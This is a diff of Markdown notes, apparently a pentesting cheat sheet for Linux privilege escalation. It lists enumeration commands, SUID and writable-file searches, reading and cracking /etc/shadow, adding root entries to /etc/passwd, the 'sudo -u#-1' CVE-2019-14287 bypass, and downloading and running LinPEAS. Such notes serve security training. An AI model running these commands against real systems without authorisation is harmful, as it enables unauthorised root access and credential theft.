@@ -6,12 +6,20 @@
 - [SSH](#ssh)
 - [Basic Enumeration](#basic-enumeration)
   - [Query the System](#query-the-system)
-  - [LinEnum.sh to Exfiltrate comprehensive system information](#linenumsh-to-exfiltrate-comprehensive-system-information)
+  - [Auto-Generated Bash Files](#auto-generated-bash-files)
+  - [Sudo Version](#sudo-version)
+  - [Sudo Rights](#sudo-rights)
 - [/etc](#etc)
+  - [/etc/passwd](#etcpasswd)
+  - [/etc/shadow](#etcshadow)
+  - [/etc/hosts](#etchosts)
+  - [Identify exploitable processes](#identify-exploitable-processes)
 - [Find Command and Interesting files](#find-command-and-interesting-files)
-- [SUID](#suid)
 - [Port Forwarding](#port-forwarding)
+  - [Identify Network Activity](#identify-network-activity)
 - [Automating Scripts](#automating-scripts)
+  - [LinPEAS](#linpeas)
+  - [LinEnum.sh](#linenumsh)
 
 
 ## TTY
@@ -69,9 +77,130 @@ After that, connect to the machine using your id_rsa file.
 
 `:> id` : overview of user's privileges; providing another username as an argument can reveal priviileges of that user
 
-`:> history` : information about the target system and limited information on potentially captured usernames and passwords
+`:> history` : information about the target system and limited information on potentially captured usernames and passwords  
 
-### LinEnum.sh to Exfiltrate comprehensive system information
+### Auto-Generated Bash Files
+
+Bash keeps tracks of our actions by putting plaintext used commands into a history file `~/.bash_history`  
+
+Use read permission on this file to enumerate system user's action and retrieve some sensitive information. (plaintext passwords, privilege escalation methods, etc..)  
+
+`.bash_profile` and `.bashrc` contain shell commands run when `Bash` is invoked  
+May contain start-up settings that can potentially reveal information. For example a bash alias can be pointed towards an important file or process.  
+
+### Sudo Version
+
+Sudo version can identify known exploits and vulnerabilities.  
+`:> sudo -V` to retrieve the version.  
+For example, sudo versions < 1.8.28 are vulnerable to CVE-2019-14287, which is a vulnerability that allows to gain root access with 1 simple command.  
+
+### Sudo Rights
+
+`:> sudo -l` : list commands on which the current user may use sudo  
+`:> sudo -u#<user id> <command>` : execute a command using the profile of the given `<user id>`, which might be in the sudoers file  
+`:> sudo -u#-1 <command>` : sudo security bypass (CVE-2019-14287) with potentially available commands
+`:> sudo visudo` : edit the sudoers file
+
+
+
+## /etc
+
+central location for all your configuration files and it can be treated as a metaphorical nerve center of your Linux machine.  
+Identify files which you are able to read and write.  
+
+### /etc/passwd
+
+It's a plain-text file that contains a list of the system's accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
+Each line of this file represents a different account, created in the system.  
+Each field is separated with a colon (:) and carries a separate value.  
+Easily enumerate all existing users, services and other accounts on the system.  
+This can open a lot of vectors for you and lead to the desired root.  
+With read/write access, easily get root creating a custom entry with root priveleges.  
+
+### /etc/shadow
+
+Stores actual password in an encrypted format (aka hashes) for user’s account with additional properties related to user password.  
+Those encrypted passwords usually have a pretty similar structure, making it easy for us to identify the encoding format and crack the hash to get the password.  
+Use /etc/shadow to retrieve different user passwords.  
+In most of the situations, it is more than enough to have reading permissions on this file to escalate to root privileges.  
+With read permissions, crack the encrypted password using one of the cracking methods.  
+With write permissions, add a new root user by making a custom entry
+
+### /etc/hosts
+
+Simple text file allowing users to assign a hostname to a specific IP address.  
+In real-world pentesting this file may reveal a local address of devices in the same network.  
+It can help us to enumerate the network further.  
+
+### Identify exploitable processes  
+
+`:> ps` : view running processes for current shell
+`:> ps -A` : view all running processes
+`:> ps axjf` : view process tree
+`:> ps aux` : processes for all users (a); user launched processes (u); not attached to a terminal (x)
+
+## Find Command and Interesting files  
+
+`:> find . -name "*string*` : find all files in the current directory whose name contains 'string'  
+`:> find . -name flag1.txt` : find the files in the current directory with the name "flag1.txt”  
+`:> find /home -name flag1.txt` : find the files in the /home directory with the name “flag1.txt”  
+`:> find / -type d -name config` : recursively search from the root directory to find the directory named config  
+`:> find / -type f -perm 777` : recursively search from the root directory and list files readable, writable, and executable by all users  
+`:> find / -perm a=x` : recursively search from the root directory and list all executable files  
+`:> find /home -user frank` : recursively search from the /home directory and list all files for user “frank”  
+`:> find / -mtime 10` : recursively search from the root directory and list all files modified in the last 10 days  
+`:> find / -atime 10` : recursively search from the root directory and list all files accessed in the last 10 days  
+`:> find / -cmin -60` : recursively search from the root directory and list all files changed within the last hour (60 minutes)  
+`:> find / -amin -60` : recursively search from the root directory and list all files accessed within the last hour  
+`:> find / -size 50M` : recursively search from the root directory and list all files 50 MB in size  
+`:> find / =writable -type d 2>/dev/null` : recursively search from the root directory and list all world-writeable directories  
+`:> find / -perm -222 -type d 2>/dev/null` : recursively search from the root directory and list all world-writeable directories  
+`:> find / -perm -o w -type d 2>/dev/null` : recursively search from the root directory and list all world-writeable directories  
+`:> find / -perm -o x -type d 2>/dev/null` : recursively search from the root directory and list all world-executable directories  
+`:> find / -name perl* OR python* OR gcc*` : recursively search from the root directory and list development tools / supported languages  
+`:> find / -perm -u=s -type f 2>/dev/null` : recursively search from the root directory and list all files where special privileges are set for everyone.  
+`:> find / -perm /1000` : recursively search from the root directory and list objects with the sticky bit set  
+`:> find / -perm /2000` : recursively search from the root directory and list objects with the SGID bit set  
+`:> find / -perm /4000` : recursively search from the root directory and list objects with the SUID bit set  
+
+A [list](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/) of file extensions for which you usually look.  
+
+## Port Forwarding
+
+Application of network address translation (NAT)  
+redirects a request from one address and port number combination to different address and port number combination.  
+Used while packets are traversing a network gateway, such as a router or firewall".  
+allows you to bypass firewalls  
+enumerate some local services and processes running on the box.  
+
+Read more about [port forwarding](fumenoid.github.io/posts/port-forwarding)  
+
+### Identify Network Activity  
+
+`:> ifconfig` : network interfaces on the system; useful for pivoting
+`:> ip route` : which network routes exist
+`:> netstat` : list existing communications  
+`:> netstat -a` : show all listening ports and established connections  
+`:> netstat -at` or `-au` : lists TCP or UDP protocols  
+`:> netstat -l` : lists "listening" ports open to incoming communciations  
+`:> netstat -lt` : lists listening TCP ports  
+`:> netstat -s` : lists useage statics by protocol can be also used with "-t" or "-u"  
+`:> netstat -tp` : connections with the service name and PID information; add "l" to get listening ports  
+`:> netstat -i` : interface statistics  
+`:> netstat -ano` : "a" display all sockets; 'n' do not resolve names; "o" display timers  
+
+## Automating Scripts
+
+### LinPEAS
+
+Linux local Privilege Escalation Awesome Script (.sh) is a script that searches for possible paths to escalate privileges on Linux/ hosts. 
+automatically searches for passwords, SUID files and Sudo right abuse to hint you on your way towards root. 
+
+`wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh`  
+
+`:> ./linpeas.sh`
+
+### LinEnum.sh
 
 Get LinEnum.sh onto the attacking device
 
@@ -120,13 +249,3 @@ Shutdown the server on the attacking device
 Reverse the server setup and transfer the enum.txt to the attacking device for analysis and resource development.
 
 ![Data Exfiltration](assets/Linux-PrivEsc-01-LinEnum-07.png)
-
-## /etc
-
-## Find Command and Interesting files  
-
-## SUID
-
-## Port Forwarding
-
-## Automating Scripts
